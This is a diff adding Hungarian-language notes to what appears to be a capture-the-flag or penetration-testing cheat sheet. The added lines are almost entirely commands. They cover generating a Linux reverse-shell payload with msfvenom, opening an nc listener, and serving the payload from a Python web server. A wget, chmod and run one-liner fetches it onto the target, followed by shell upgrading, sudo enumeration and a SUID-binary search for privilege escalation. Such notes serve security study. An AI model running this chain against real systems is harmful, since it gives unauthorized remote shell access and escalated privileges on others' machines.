@@ -348,4 +348,14 @@ HA DIRBUSTER:
 ha valahol tudok kódot futtatni, akkor mondjuk cat, ha tudom hol van a flag
 letöltünk a gépre egy reverse shellt
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=MIIPCÍMÜNK LPORT=4444 -f elf > shell.elf
+közbe másik terminál nc -lvnp 4444 
+a mappában ahol van a .elf fájl nyitunk egy python webszervert python3 -m http.server 
+a támadó gépen ahova tudok parancsot írni: cd /tmp;rm -rf shell.elf;wget http://MIIPCÍMÜNK:8000/shell.elf;chmod 777 shell.elf;ls -l /tmp
+ha fent van a támadó gépen akkor /tmp/shell.elf utána a listeneres terminálba menni
+python3 -c "import pty;pty.spawn('/bin/bash')"
+sudo -l  - Mihez van jogunk
+ls /home - felhasználók
+ls /home/felhasználó ha nem tudom használni akkor SUID bitek
+find / -perm -u=s 2>/dev/null
+
 
